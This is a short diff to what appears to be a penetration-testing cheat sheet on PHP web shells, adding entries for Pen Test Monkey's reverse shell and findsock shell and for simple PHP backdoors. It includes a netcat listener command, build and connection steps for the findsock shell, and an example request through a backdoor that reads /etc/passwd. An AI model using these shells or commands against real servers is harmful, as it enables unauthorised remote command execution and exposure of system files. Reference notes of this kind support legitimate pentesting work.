@@ -30,3 +30,18 @@ if($_GET['cmd']) {
 http://pentestmonkey.net/tools/web-shells/php-reverse-shell
 
 $ nc -v -n -l -p 1234
+
+Pen Test Monkey - PHP Reverse Shell:
+- /usr/share/webshells/php/php-reverse-shell.php
+
+Pen Test Monkey, Findsock Shell. Build gcc -o findsock findsock.c (be mindfull of the target servers architecture), execute 
+with netcat not a browser nc -v target 80:
+- /usr/share/webshells/php/php-findsock-shell.php
+- /usr/share/webshells/php/findsock.c
+
+- PHP backdoor, usefull for CMD execution if upload / code injection is possible, usage: 
+- http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+- /usr/share/webshells/php/simple-backdoor.php 
+
+ Larger PHP shell, with a text input box for command execution:
+- /usr/share/webshells/php/php-backdoor.php
